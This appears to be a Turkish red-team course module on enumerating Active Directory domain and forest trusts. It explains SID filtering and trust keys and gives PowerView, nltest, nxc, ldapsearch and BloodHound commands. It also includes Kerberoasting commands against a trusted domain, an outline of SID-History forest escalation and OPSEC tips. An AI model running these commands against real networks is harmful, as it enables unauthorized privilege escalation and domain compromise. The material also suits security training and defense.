## 1. Kavramsal Temel — Neden Var?

Bir domain'i ele geçirmek çoğu zaman **son durak değildir**. Kurumlar birden çok domain ve forest'ı **güven ilişkileriyle (trust)** birbirine bağlar. Kilit içgörü:

> **Trust, bir domain'deki kimliğin diğerinde de doğrulanmasını sağlar. Saldırgan için bu, "ele geçirdiğim domain'den hangi başka domain'lere köprü var?" haritasıdır.** Yanlış yapılandırılmış bir trust (özellikle SID filtering kapalıysa), child domain admin'inden **forest kökü** ele geçirmeye giden yolu açar.

Keşif aşamasında amaç sömürü değil, **saldırı yüzeyini görmektir**: hangi trust'lar var, yönü ne, transitif mi, SID filtering açık mı, forest içi mi (intra) yoksa forest'lar arası mı (inter).

**Analoji:** Her domain bir bina. Trust'lar binalar arası kapalı köprüler. Bazı köprüler tek yön, bazıları çift; bazılarında kimlik kartın karşı binada da geçerli (transitif). SID filtering = köprüdeki güvenlik kontrolü; kapalıysa sahte yetki kartıyla ([SID History, M10.1](../Modul_10_Trust_Forest_ve_Hibrit_Saldirilar/)) geçebilirsin.

## 2. Teknik Derinlik — Trust Türleri ve Tehlike Yüzeyi

### 2.1 Trust yönü ve transitiflik

```
   Yön (direction)                 Transitiflik
   ───────────────                 ────────────
   A → B  (one-way)   B, A'ya güvenir; A'daki kimlik B'de geçerli
   A ↔ B  (two-way)   karşılıklı
                                   Transitif: A↔B, B↔C ⇒ A, C'ye de erişebilir
                                   Non-transitif: yalnızca doğrudan eşler

   Forest içi (parent-child): OTOMATİK two-way + transitif  → geniş yüzey
   Forest arası (external / forest trust): manuel, SID filtering VARSAYILAN açık
```

### 2.2 Kritik trust öznitelikleri (`trustAttributes` bit alanı)

`CN=System` altındaki **trustedDomain** nesnelerinde okunur:

| Bit | Ad | Red için anlamı |
|-----|-----|-----------------|
| `0x1` | NON_TRANSITIVE | Transitif değil → yayılım sınırlı |
| `0x8` | FOREST_TRANSITIVE | Forest trust (inter-forest) |
| `0x40` | TREAT_AS_EXTERNAL | SID filtering davranışını etkiler |
| `0x400` | USES_RC4_ENCRYPTION | Zayıf şifreleme → trust key saldırısı |
| — | **SID filtering durumu** | Kapalıysa **SID History injection** ([M10.1](../Modul_10_Trust_Forest_ve_Hibrit_Saldirilar/)) forest yükseltmesi mümkün |

> **En kritik keşif sorusu:** *"Intra-forest trust'ta SID filtering varsayılan olarak UYGULANMAZ."* Yani bir child domain'i ele geçirdiysen, forest kökü genelde **tek zincir uzaklıktadır** — bu yüzden forest, güvenlik sınırıdır; domain değildir.

### 2.3 Trust key ve inter-realm TGT — sömürünün temeli

İki domain trust kurduğunda, aralarında paylaşılan bir **trust key** (inter-realm anahtarı) oluşur; her iki tarafta `trustedDomain`/`trustedDomainObject` (TDO) olarak saklanır. Kerberos'ta bir kullanıcı başka domain'deki kaynağa erişmek istediğinde:

```
   Kullanıcı (DOMAIN-A)                    KDC-A            KDC-B
     │ TGS-REQ: "krbtgt/DOMAIN-B ver"       │                │
     │─────────────────────────────────────▶│                │
     │ inter-realm TGT (trust key ile şifreli)                │
     │◀─────────────────────────────────────│                │
     │ inter-realm TGT ile TGS-REQ ────────────────────────▶ │
     │ B'deki servis için ST ◀──────────────────────────────│
```

> **Neden keşifte önemli?** Trust key'i ([Modül 10](../Modul_10_Trust_Forest_ve_Hibrit_Saldirilar/)) ele geçirirsen **inter-realm TGT forge** edersin (trust-key/inter-realm Golden Ticket). Keşifte `USES_RC4_ENCRYPTION` bitini görmek = trust key RC4 = forge/kırma daha kolay demektir. Bu yüzden `trustAttributes`'ı bit bit oku.

### 2.4 SID filtering — köprüdeki tek güvenlik kontrolü

Bir kullanıcının Kerberos PAC'ında **SID History** alanı taşınır. SID filtering, trust üzerinden gelen bilette **yabancı/yüksek-ayrıcalıklı SID'leri süzer** (özellikle RID ≥ 1000 dışı, Enterprise Admins gibi).

```
   SID filtering KAPALI (intra-forest varsayılanı):
     child domain admin → PAC'a Enterprise Admins SID'i (S-1-5-21-...-519) enjekte et
     → forest kök DC bunu KABUL eder → forest ele geçti (SID History injection, M10.1)

   SID filtering AÇIK (external/forest trust varsayılanı):
     enjekte edilen yüksek SID süzülür → saldırı engellenir
```

> **Keşif çıkarımı:** `WithinForest` trust'larda SID filtering **uygulanmaz** → child'dan forest köküne yol neredeyse her zaman açıktır. External/forest trust'larda varsayılan açıktır ama `netdom ... /enablesidhistory` veya `/quarantine` yanlış ayarlanmışsa yüzey açılır. Keşifte bu ayarı doğrula.

### 2.5 Foreign Group Membership — sessiz köprü

Bir domain'deki kullanıcı, **başka domain'deki** bir gruba üye olabilir (Foreign Security Principal, `CN=ForeignSecurityPrincipals`). BloodHound bunu `ForeignGroupMembership`/cross-domain kenarları olarak çizer. Bu, trust üzerinden **doğrudan yetki** demektir — trust key gerekmeden, meşru üyelik olarak.

## 3. Pratik Uygulama — Çok Araçlı

### 3.1 PowerView / .NET

```powershell
# Mevcut domain'in trust'ları
Get-DomainTrust
# → SourceName, TargetName, TrustDirection (Bidirectional), TrustType (WithinForest), TrustAttributes

# Tüm forest'ı gez (transitif olarak ulaşılan her trust)
Get-DomainTrustMapping

# Forest'taki tüm domain'ler ve GC'ler
Get-ForestDomain -Forest corp.local
Get-ForestGlobalCatalog

# Karşı domain'deki gruplara üye "yabancı" kullanıcılar (köprü hesaplar)
Get-DomainForeignGroupMember -Domain child.corp.local
```

### 3.2 Yerleşik araçlar (LOLBin)

```cmd
:: en düşük iz — Windows yerleşik
nltest /domain_trusts /all_trusts
nltest /dsgetdc:corp.local

:: .NET üzerinden forest kökü
powershell "[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().RootDomain"
```

### 3.3 Linux (Impacket / nxc / ldapdomaindump)

```bash
# nxc ile trust dökümü
nxc ldap 10.10.10.5 -u jdoe -p 'Summer2024!' -M enum_trusts

# Global Catalog (3268) ile forest-geniş nesne araması — tek atışta tüm forest
ldapsearch -x -H ldap://10.10.10.5:3268 -D "jdoe@corp.local" -w 'Summer2024!' \
  -b "" "(objectClass=trustedDomain)" trustPartner trustDirection trustAttributes

# ldapdomaindump — trust dahil tüm dizini HTML/JSON'a döker
ldapdomaindump -u 'corp.local\jdoe' -p 'Summer2024!' 10.10.10.5
```

**Örnek `Get-DomainTrust` çıktısı:**
```
SourceName      : corp.local
TargetName      : dev.corp.local
TrustType       : WithinForest          ← intra-forest: SID filtering YOK
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional         ← çift yön + transitif = geniş yüzey
```
`WithinForest` + `Bidirectional` görmek = "child'ı alırsam forest kökü hedefe girer" sinyali → [Modül 10](../Modul_10_Trust_Forest_ve_Hibrit_Saldirilar/).

### 3.4 BloodHound ile trust görselleştirme + Kerberoast köprüsü

```cypher
// Forest'taki tüm trust kenarları ve yönleri
MATCH p=(:Domain)-[:TrustedBy]->(:Domain) RETURN p

// Karşı domain'deki gruplara üye "yabancı" principal'lar (trust köprüsü hesaplar)
MATCH (n)-[:MemberOf]->(g:Group) WHERE NOT n.domain = g.domain RETURN n.name, g.name
```

```powershell
# Karşı domain'de Kerberoast (trust üzerinden — kimliğim orada da geçerli)
Rubeus.exe kerberoast /domain:dev.corp.local
impacket-GetUserSPNs corp.local/jdoe:'Summer2024!' -target-domain dev.corp.local -request
```

### 3.5 Gerçek-dünya trust keşif zinciri

```
   1) Get-DomainTrust           → dev.corp.local (WithinForest, Bidirectional)
   2) Get-DomainTrustMapping    → dev ↔ corp ↔ partner.ext (external, quarantine?)
   3) SID filtering kontrolü    → WithinForest = kapalı → SID History yolu açık
   4) GetUserSPNs -target-domain → karşı domain servis hesaplarını roast et
   5) ForeignGroupMember        → dev\admin, corp\Backup Operators üyesi mi?
   → En zayıf trust'ı (WithinForest, RC4) forest yükseltme için Modül 10'a taşı.
```

**OPSEC notları:**
- Trust keşfi **son derece sessizdir**: `nltest` meşru bir Windows aracıdır, LDAP `trustedDomain` okuması loglanmaz. Bu yüzden Blue tarafı bunu **tespitle değil, mimariyle** karşılar: SID filtering'i açık tut, RC4 trust'ları kaldır, forest'ı güvenlik sınırı olarak yönet ([Blue M09](../../2-Blue_Team/Modul_09_Tehdit_Avciligi_ve_Degerlendirme/) + [Blue M10](../../2-Blue_Team/Modul_10_Olay_Mudahalesi_DFIR_ve_Kurtarma/)).
- **`WithinForest` trust'ları sömürü için önceliklendir** (SID filtering yok). External/forest trust'larda SID filtering varsayılan açık olduğundan daha zordur ama `TREAT_AS_EXTERNAL`/quarantine ayarları değişmişse yüzey açılır.
- Trust key'inin RC4 kullanması ([Modül 10](../Modul_10_Trust_Forest_ve_Hibrit_Saldirilar/)) inter-realm TGT forge etmeyi kolaylaştırır — `USES_RC4_ENCRYPTION` bitini not al.

## 5. Doğrulama / Lab

```powershell
# 1) Lab'de parent-child (intra-forest) + external trust kur, ikisini de enum et:
Get-DomainTrust     # WithinForest vs. External farkını gözle
# 2) nltest ile aynı sonucu çapraz-doğrula (araç tutarlılığı)
nltest /domain_trusts /all_trusts
# 3) SID filtering durumunu kontrol et (external trust'ta):
netdom trust child.corp.local /domain:corp.local /quarantine    # görüntüle (lab)
```
